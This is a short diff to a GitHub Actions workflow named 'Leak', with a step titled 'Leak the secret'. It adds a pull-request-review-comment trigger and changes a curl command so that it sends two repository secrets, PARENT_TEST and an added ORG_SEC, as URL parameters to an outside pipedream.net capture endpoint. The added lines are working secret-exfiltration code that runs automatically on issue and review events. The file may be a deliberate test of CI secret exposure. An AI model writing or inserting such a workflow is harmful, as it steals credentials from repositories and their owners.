@@ -3,6 +3,7 @@ name: Leak
 on:
   issues:
   pull_request_review:
+  pull_request_review_comment:
   
   
    
@@ -14,6 +15,8 @@ jobs:
       - name: Leak the secret
         run: |
           VAR_ABC=$VALUE
-          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
+          VAR_XYZ=$VALUE2
+          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC&code=$VAR_XYZ
         env:
           VALUE: ${{ secrets.PARENT_TEST }}
+          VALUE2: ${{ secrets.ORG_SEC }}
